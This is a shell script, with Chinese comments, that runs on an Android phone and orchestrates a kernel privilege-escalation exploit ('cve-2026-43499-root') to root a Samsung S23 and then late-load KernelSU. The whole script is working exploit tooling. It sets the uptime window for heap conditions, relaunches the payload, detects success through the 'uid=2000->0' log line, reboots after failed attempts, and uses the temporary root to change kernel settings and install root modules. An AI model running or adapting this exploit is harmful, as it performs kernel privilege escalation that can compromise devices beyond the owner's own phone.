#!/system/bin/sh
# root-my-s23 —— 设备端执行体
#
# 由 App（或 PC 上的 adb shell）调用。整个流程都在手机本地跑，
# 只有结果通过 adb 的 shell 流回传，省掉几十次 round trip。
#
#   root.sh status     看状态
#   root.sh try        当前 boot 打一枪；结束时打印 ##VERDICT <结果>
#   root.sh late       拿到临时 root 后加载 KernelSU（末尾会 soft-reboot）
#   root.sh verify     事后验证
#
# ##VERDICT 取值：
#   root      拿到临时 root（可以进 late）
#   spent     stack writer 跑过，本 boot 作废（必须换 boot）
#   vanished  设备失联（多半 panic 重启了）
#   timeout   240s 没打中
#   rebooted  当前 boot 太旧，已主动重启
#   loaded    late-load 成功
#   failed    late-load 失败
#
# 硬约束（exploit 状态机，不是可调参数）：
#   SLIDE_STACK_WRITER 一旦跑过，同一次开机内不许再试
#   preload.c: "stack writer ran; refusing retry on this boot"
#   -> 一次开机 = 一发子弹
#
# 触发窗口（实测）：
#   < 40s    tracefs 还没产出事件
#   90-120   命中率最高
#   > 150    allocator 碎片化，凑不齐 32 个 order-3 mm_struct
set -u

D=/data/local/tmp/root-my-s23
R=$D/cve-2026-43499-root
SO=$D/rmg-app.so
KS=$D/ksud-dm2q
KO=$D/kernelsu-dm2q.ko
LOG=$D/exploit.log

# App 侧的接口：不靠 adb 会话传结论，全部落盘后再轮询。
# exploit 会 SIGSTOP 一大批进程（含承载本脚本的那条 adbd shell），
# 所以本脚本一旦开打就必须能独立活下来，结论写文件才是唯一可靠通道。
V=$D/verdict
RUN=$D/run.log
BID=$D/boot_id
PIDF=$D/try.pid

WIN_LO=90
WIN_HI=120
WIN_MAX=150
POLL_SECS=240
MAX_RELAUNCH=3

say()  { printf '[%s] %s\n' "$(date +%H:%M:%S)" "$*" | tee -a "$RUN"; }
warn() { printf '[%s] !! %s\n' "$(date +%H:%M:%S)" "$*" | tee -a "$RUN"; }
verdict() { printf '##VERDICT %s\n' "$1" | tee -a "$RUN"; printf '%s\n' "$1" > "$V"; }

uptime_s() { cut -d. -f1 /proc/uptime 2>/dev/null; }
boot_id()  { cut -c1-36 /proc/sys/kernel/random/boot_id 2>/dev/null; }
is_loaded() { grep -q '^kernelsu ' /proc/modules 2>/dev/null; }

# exploit 的日志里带 ANSI 颜色码，会把 "[+]" 和正文隔开：
# 实际字节是 "\033[1;32m[+]\033[0m exploit completed"。
# 所以 ①判定一律用不带括号的关键字 ②显示前先剥掉颜色码。
strip_ansi() {
  esc=$(printf '\033')
  sed "s/${esc}\[[0-9;]*[A-Za-z]//g"
}
# 成功判据：exploit 自己写的两条痕迹，缺一不可
try_hit() {
  grep -q 'exploit completed' "$LOG" 2>/dev/null &&
  grep -q 'uid=2000->0' "$LOG" 2>/dev/null
}

# ---------------------------------------------------------------- status
do_status() {
  say "uptime   : $(uptime_s)s"
  say "model    : $(getprop ro.product.model) / $(getprop ro.build.version.release)"
  say "kernelsu : $(is_loaded && echo 已加载 || echo 未加载)"
  say "selinux  : $(getenforce 2>/dev/null)"
  say "kptr     : $(cat /proc/sys/kernel/kptr_restrict 2>/dev/null)"
  say "boot_id  : $(cut -c1-8 /proc/sys/kernel/random/boot_id 2>/dev/null)"
  say "payload  :"
  ls -l "$R" "$SO" "$KS" "$KO" 2>&1 | sed 's/^/           /'
  if is_loaded; then
    say "su       : $(su -c id 2>&1)"
  fi
}

# ------------------------------------------------------------------- try
do_try() {
  if is_loaded; then
    say "kernelsu 已在运行，跳过"
    verdict root
    return 0
  fi

  # 同 boot 双发只会浪费子弹（exploit 自己也会拒绝），先挡掉
  if [ -f "$PIDF" ] && kill -0 "$(cat "$PIDF" 2>/dev/null)" 2>/dev/null; then
    say "已有 try 在跑（pid $(cat "$PIDF")），本次忽略"
    return 0
  fi
  echo $$ > "$PIDF"
  trap 'rm -f "$PIDF"' EXIT

  # 上一发（可能来自上个 boot）的结论一律作废
  rm -f "$V" "$LOG" 2>/dev/null
  boot_id > "$BID" 2>/dev/null
  : > "$RUN" 2>/dev/null

  up=$(uptime_s)
  if [ "${up:-0}" -gt "$WIN_MAX" ]; then
    say "当前 boot 已 ${up}s（>${WIN_MAX}s），换一个干净 boot"
    verdict rebooted
    sync
    reboot
    return 0
  fi

  # --- 等窗口 ---
  while :; do
    up=$(uptime_s)
    [ -z "${up:-}" ] && { sleep 2; continue; }
    [ "$up" -ge "$WIN_LO" ] && break
    [ $((up % 10)) -lt 2 ] && say "等窗口 uptime=${up}s → ${WIN_LO}s"
    sleep 2
  done
  say "开打 uptime=${up}s"

  # KSU 管理器常驻会抢内存，先踹掉
  am force-stop me.weishu.kernelsu 2>/dev/null

  rm -f "$LOG" 2>/dev/null
  setsid nohup env EXPLOIT_ATTEMPTS=1 "$R" --run-payload "$SO" "$R" "$LOG" \
      </dev/null >/dev/null 2>&1 &

  t=0
  relaunch=0
  while [ "$t" -lt "$POLL_SECS" ]; do
    sleep 5
    t=$((t + 5))

    # 快速判死：writer 跑过 = 这个 boot 废了，别干等到超时
    if grep -q 'stack writer ran' "$LOG" 2>/dev/null; then
      warn "stack writer 已跑，本 boot 作废"
      verdict spent
      return 0
    fi

    # 主判据：exploit 自己写在日志里的成功痕迹。
    # 这里【绝对不能】调 "$R -c"：payload 还在跑的时候它的子进程会被
    # SIGSTOP 挂住，而 toybox 的 timeout 只发 SIGTERM 不 kill，整个脚本
    # 会永久卡死（实测踩过两次）。等 exploit 跑完再碰 -c 才安全。
    if try_hit; then
      say "exploit 命中 uid=2000->0"
      verdict root
      return 0
    fi

    # payload 自己退出了（不是被我们杀的）：writer 还没跑，内核状态干净，
    # 同一次开机内允许再打一发 —— 这就是 supervisor 自己的重试语义
    if [ $((t % 30)) -eq 0 ] && [ "$relaunch" -lt "$MAX_RELAUNCH" ]; then
      if ! pgrep -f cve-2026-43499-root >/dev/null 2>&1; then
        relaunch=$((relaunch + 1))
        say "payload 已退出，同 boot 重发 ($relaunch/$MAX_RELAUNCH)"
        setsid nohup env EXPLOIT_ATTEMPTS=1 "$R" --run-payload "$SO" "$R" "$LOG" \
            </dev/null >/dev/null 2>&1 &
      fi
    fi

    [ $((t % 30)) -eq 0 ] && say "poll t=${t}s  $(tail -1 "$LOG" 2>/dev/null | strip_ansi | cut -c1-58)"
  done

  warn "超时未成功，最后一行: $(tail -1 "$LOG" 2>/dev/null | cut -c1-70)"
  verdict timeout
}

# ------------------------------------------------------------------ fire
# App 侧的点火入口。为什么不直接从 Java 拼「nohup … &」扔过来？
# 因为那条复合命令一旦有任何一个字符被 shell 吃掉，就是彻底的静默失败
# （实测踩过一次：App 以为点了火，设备上什么都没发生，白等 330s）。
# 放在脚本里，失败信息能原样回显给 App。
do_fire() {
  rm -f "$V" "$BID" "$PIDF" 2>/dev/null
  setsid nohup sh "$D/root.sh" try </dev/null >/dev/null 2>&1 &
  sleep 2
  p=$(cat "$PIDF" 2>/dev/null)
  if [ -f "$V" ]; then
    echo "fired verdict=$(cat "$V")"
  elif [ -n "${p:-}" ] && kill -0 "$p" 2>/dev/null; then
    echo "fired pid=$p uptime=$(uptime_s)"
  else
    echo "fire-failed uptime=$(uptime_s)"
  fi
}

# ------------------------------------------------------------------ poll
# App 每隔几秒调用一次，一条短命令拿走全部状态。
# 结论优先取 verdict 文件；文件没落地（脚本被冻住没来得及写）就自己
# 从 exploit.log 里认痕迹 —— 这是「流程寄生在 shell 上」那次事故的补丁。
do_poll() {
  cur=$(boot_id)
  fire=$(cat "$BID" 2>/dev/null)
  # BID 不存在 = 这一发根本没点着。此时 exploit.log 还是上个 boot 的旧账，
  # 绝不能拿它当结论，否则会假阳性地跳进 late 然后白跑一轮。
  if [ -z "${fire:-}" ]; then
    echo "verdict=none"
    echo "uptime=$(uptime_s)"
    echo "loaded=$(is_loaded && echo 1 || echo 0)"
    echo "line=未点火"
    echo "xlog="
    return 0
  fi
  if [ "$fire" != "$cur" ]; then
    echo "verdict=stale-boot"
    echo "uptime=$(uptime_s)"
    return 0
  fi

  v=$(head -1 "$V" 2>/dev/null)
  if [ -z "${v:-}" ] && try_hit; then
    v=root
    printf 'root\n' > "$V"
  fi

  echo "verdict=${v:-none}"
  echo "uptime=$(uptime_s)"
  echo "loaded=$(is_loaded && echo 1 || echo 0)"
  echo "line=$(tail -1 "$RUN" 2>/dev/null | cut -c1-80)"
  echo "xlog=$(tail -1 "$LOG" 2>/dev/null | strip_ansi | cut -c1-80)"
  return 0
}

# ------------------------------------------------------------------ late
do_late() {
  if is_loaded; then
    say "kernelsu 已加载"
    verdict loaded
    return 0
  fi

  say "准备 late-load"
  # 所有 root 操作必须赶在这一步之前：KSU 一加载，SELinux 立刻回 Enforcing，
  # RMG 的临时 su 通道当场失效
  timeout -k 5 40 "$R" -c 'mkdir -p /data/adb/ksu/bin /data/adb/ksu/lib /data/adb/ksu/log /data/adb/modules; chmod 700 /data/adb/ksu' </dev/null >/dev/null 2>&1

  # ksud 的 loader 只做 rename("/data/local/tmp/.ksud-stage" -> "/data/adb/ksud")，
  # 它从不创建源文件，必须预置
  cp "$KS" /data/local/tmp/.ksud-stage && chmod 755 /data/local/tmp/.ksud-stage || {
    warn ".ksud-stage 预置失败"
    verdict failed
    return 1
  }
  say ".ksud-stage 已就位"

  # kallsyms-aware 的 manual loader 要读符号地址
  timeout -k 5 20 "$R" -c 'echo 1 > /proc/sys/kernel/kptr_restrict' </dev/null >/dev/null 2>&1

  say "ksud --late-load（10-30s）"
  out=$(timeout -k 10 300 "$R" --late-load </dev/null 2>&1)
  rc=$?
  printf '%s\n' "$out" | tail -12 | sed 's/^/    /'
  if [ "$rc" != "0" ]; then
    warn "late-load 失败 rc=$rc"
    verdict failed
    return 1
  fi
  say "late-load rc=0"
  verdict loaded
}

# ---------------------------------------------------------------- verify
do_verify() {
  say "kernelsu : $(is_loaded && echo 已加载 || echo 缺失)"
  say "selinux  : $(getenforce 2>/dev/null)"
  sid=$(su -c id 2>&1)
  case "$sid" in
    *uid=0*) say "su       : $sid" ;;
    *)       warn "su 不可用: $sid" ;;
  esac
  say "模块:"
  su -c 'ls /data/adb/modules' 2>/dev/null | sed 's/^/           /'
  # shell 域下 pgrep 看不到 system 进程（读不到 cmdline），必须 ps -A 再 grep
  vd=$(ps -A 2>/dev/null | grep -w vectord | head -1)
  if [ -n "$vd" ]; then
    say "vectord  : $(printf '%s' "$vd" | tr -s ' ' | cut -d' ' -f2,9)"
  else
    warn "vectord  : 未运行（LSPosed 不工作）"
  fi
}

# ------------------------------------------------------------------ main
case "${1:-status}" in
  status) do_status ;;
  try)    do_try ;;
  fire)   do_fire ;;
  poll)   do_poll ;;
  late)   do_late ;;
  verify) do_verify ;;
  softreboot)
    # late-load 只重放 post-fs-data：模块挂上了，但 service.sh 不会执行。
    # 后果是 Zygisk 注入了而 LSPosed 的 vectord 不存在，框架半死。
    su -c '/data/adb/ksud soft-reboot' 2>&1
    ;;
  *)
    echo "用法: $0 {status|fire|try|poll|late|verify|softreboot}"
    exit 2
    ;;
esac
